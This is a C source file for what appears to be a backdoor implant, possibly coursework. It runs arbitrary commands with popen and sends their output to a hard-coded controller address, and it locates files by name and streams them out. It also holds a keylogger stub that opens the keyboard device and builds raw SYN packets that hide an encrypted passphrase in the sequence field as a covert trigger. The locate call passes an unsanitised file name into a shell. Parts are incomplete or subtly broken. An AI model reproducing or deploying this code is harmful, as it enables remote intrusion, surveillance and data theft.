#include "functionality.h"

int sendBuffer(int socket, char *buffer, int length);
int processFile(char *filePath, int socket);
int tcpConnect();

void executeSystemCall(char *command)
{
    int socket = 0;
    char line[PATH_MAX];
    FILE *results = NULL;
    
    // Execute and open the pipe for reading
    results = popen(command, "r");
    
    // Make sure we have something yo
    if (results == NULL)
    {
        return;
    }
    
    // Open a connection back to the client
    if ((socket = tcpConnect()) == 0)
    {
        return;
    }
    
    // Make sure we do not receive any data
    shutdown(socket, SHUT_RD);
    
    // Read from the stream
    while (fgets(line, PATH_MAX, results) != NULL)
    {
        sendBuffer(socket, line, strnlen(line, PATH_MAX));
    }
    
    pclose(results);
    close(socket);
}

void retrieveFile(char *fileName)
{
    int socket = 0;
    char line[PATH_MAX];
    FILE *results = NULL;
    
    // Update the database for locate
    system("updatedb");
    
    // Combine the file name with the locate command
    snprintf(line, sizeof(line), "locate %s", fileName);
    
    // Execute and open the pipe for reading
    results = popen(line, "r");
    
    // Make sure we have something yo
    if (results == NULL)
    {
        return;
    }
    
    // Open a connection back to the client
    if ((socket = tcpConnect()) == 0)
    {
        return;
    }
    
    // Make sure we do not receive any data
    shutdown(socket, SHUT_RD);
    
    // This will handle multiple results from locate, client may break depending
    // on the type of file requested.
    while (fgets(line, PATH_MAX, results) != NULL)
    {
        processFile(line, socket);
    }
    
    pclose(results);
    close(socket);
    
}

void keylogger()
{
#ifdef __linux__
    int keyboard = 0;
    
    // Open the keyboard input device for listening
    keyboard = open(KEYBOARD_DEVICE, O_RDONLY | O_NOCTTY);
    if (keyboard == -1)
    {
        systemFatal("Unable to open keyboard");
        return;
    }
#endif
}

int sendBuffer(int socket, char *buffer, int length)
{
    int sentBytes = 0;
    int bytesLeft = length;
    int temp = 0;
    
    while(sentBytes < length)
    {
        temp = send(socket, buffer + sentBytes, bytesLeft, 0);
        if (temp == -1)
            return -1;
        sentBytes += temp;
        bytesLeft -= temp;
    }
    return sentBytes;
}

int tcpConnect()
{
    int error = 0;
    int handle = 0;
    struct hostent *host;
    struct sockaddr_in server;
    
    host = gethostbyaddr(SOURCE_IP, strlen(SOURCE_IP), AF_INET);
    handle = socket (AF_INET, SOCK_STREAM, 0);
    if (handle == -1)
    {
        return 0;
    }
    else
    {
        server.sin_family = AF_INET;
        server.sin_port = htons (SOURCE_PORT_INT);
        server.sin_addr = *((struct in_addr *) host->h_addr);
        bzero (&(server.sin_zero), 8);
        
        error = connect (handle, (struct sockaddr *)&server, sizeof(struct sockaddr));
        if (error == -1)
        {
            return 0;
        }
    }
    
    return handle;
}

int processFile(char *filePath, int socket)
{
    char line[PATH_MAX];
    FILE *file = NULL;
    
    // Open the file for reading
    file = fopen(filePath, "r");
    if (file == NULL)
    {
        return -1;
    }
    
    // Read and send the file
    while (fgets(line, PATH_MAX, file) != NULL)
    {
        if (sendBuffer(socket, line, strnlen(line, PATH_MAX)) == -1)
        {
            return -1;
        }
    }
    return 0;
}

char *createRawTcpPacket(char *data, int dataLength)
{
    char *buffer = NULL;
    char date[11];
    char *commandBuffer = NULL;
    char *passphrase = NULL;
    char *encryptedField = NULL;
    int sock = 0;
    int one = 1;
    int packetLength = 0;
    const int *val = &one;
    struct ip *iph = NULL;
    struct tcphdr *tcph = NULL;
    struct sockaddr_in sin;
    struct sockaddr_in din;
    struct tm *timeStruct;
    time_t t;
    
    buffer = malloc(sizeof(struct ip) + sizeof(struct tcphdr));
    iph = (struct ip *) buffer;
    tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
    
    // Get the time and create the secret code
    time(&t);
    timeStruct = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
    passphrase = strdup(PASSPHRASE);
    encryptedField = encrypt_data(passphrase, date, 4);
    
    // Fill out the addess structs
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(*info->srcPort);
    din.sin_port = htons(*info->destPort);
    sin.sin_addr.s_addr = inet_addr((info->srcHost));
    din.sin_addr.s_addr = inet_addr((info->destHost));
    
    // Zero out the buffer
    memset(buffer, 0, packetLength);
    
    // IP structure
#ifdef __APPLE__
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 16;
    iph->ip_len = packetLength;
    iph->ip_id = htons(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = 6;
    iph->ip_sum = 0;
    iph->ip_src = sin.sin_addr;
    iph->ip_dst = din.sin_addr;
#else
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = packetLength;
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = sin.sin_addr;
    iph->daddr = din.sin_addr;
#endif
    
    // TCP structure
#ifdef __APPLE__
    tcph->th_sport = htons(*info->srcPort);
    tcph->th_dport = htons(*info->destPort);
    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
    tcph->th_ack = 0;
    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(32767);
    tcph->th_sum = 0;
    tcph->th_urp = 0;
#else
    tcph->source = htons(*info->srcPort);
    tcph->dest = htons(*info->destPort);
    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(32767);
    tcph->check = 0;
    tcph->urg_ptr = 0;
#endif
    // This should be freed by whoever calls this function!
	return buffer;
}
